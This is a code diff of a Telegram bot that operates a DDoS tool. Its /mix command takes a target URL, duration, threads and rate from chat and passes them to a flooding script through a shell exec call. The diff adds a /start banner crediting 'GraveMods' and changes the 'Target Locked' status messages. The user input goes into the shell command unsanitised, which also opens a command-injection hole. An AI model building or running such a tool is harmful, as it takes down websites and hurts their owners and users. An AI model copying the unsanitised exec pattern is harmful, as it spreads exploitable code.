@@ -29,6 +29,11 @@ bot.on('message', (msg) => {
   logActivity(msg);
 
   // Menanggapi perintah /mix
+  if (command.startsWith('/start')){
+  bot.sendMessage(chatId , `Hello @${user.username} ,Ddos By @GraveMods - @ZemoEngine !\n• Use Mix To Start`);
+  return;
+  }
+  
   if (command.startsWith('/mix')) {
     // Mengekstrak argumen dari pesan
     const args = command.split(' ');
@@ -43,13 +48,12 @@ bot.on('message', (msg) => {
       exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
         if (error) {
           console.error(`Error: ${error.message}`);
-          bot.sendMessage(chatId, 'Successful');
+          bot.sendMessage(chatId, `Target Locked..\n\nTarget Website : ${url}\nTime : ${time}sec\nThread : ${thread}\n Rate : ${rate}\nStatus : Successfull ✅`);
           return;
         }
         if (stderr) {
           console.error(`stderr: ${stderr}`);
-          bot.sendMessage(chatId, `Target Locked..\n\nTarget Website : ${url}\nTime : ${time}sec\nThread : ${thread}\n Rate : ${rate}\nStatus : Successfull ✅`);
-          bot.sendMessage(chatId, 'Successful');
+          bot.sendMessage(chatId, `Successfull`);
           return;
         }
         // Menampilkan output stdout jika berhasil
